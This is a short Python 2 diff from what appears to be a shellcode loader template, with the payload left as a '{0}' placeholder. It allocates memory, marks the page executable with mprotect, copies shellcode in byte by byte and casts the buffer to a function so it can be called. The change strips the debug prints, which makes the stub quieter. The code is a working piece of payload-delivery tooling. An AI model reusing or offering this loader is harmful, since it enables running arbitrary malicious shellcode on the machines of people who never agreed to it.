@@ -168,17 +168,14 @@ psc = "{0}"
 libc.malloc.restype = c_void_p
 libc.malloc(0x400)
 sc = libc.malloc(0x400)
-print '[+]\tMemory of shellcode ' + hex(sc)
 page = ((sc >> 12) << 12)
-print '[+]\tPage of shellcode: ' + hex(page)
 page = cast(page, POINTER(c_void_p))
 libc.mprotect.argtype = [c_void_p, c_void_p, c_long]
-print '[i]\tMprotect success is 0: %d' % libc.mprotect(page, 1, 7)
+libc.mprotect(page, 1, 7)
 index = 0
 for c in psc:
     c_int.from_address
     ptr = c_char.from_address(sc + index)
-    print '[i]\twriting 0x%x to 0x%x' % (ord(c), sc+index)
     ptr.value = c
     index += 1
 fn = cast(sc, CFUNCTYPE(c_void_p))
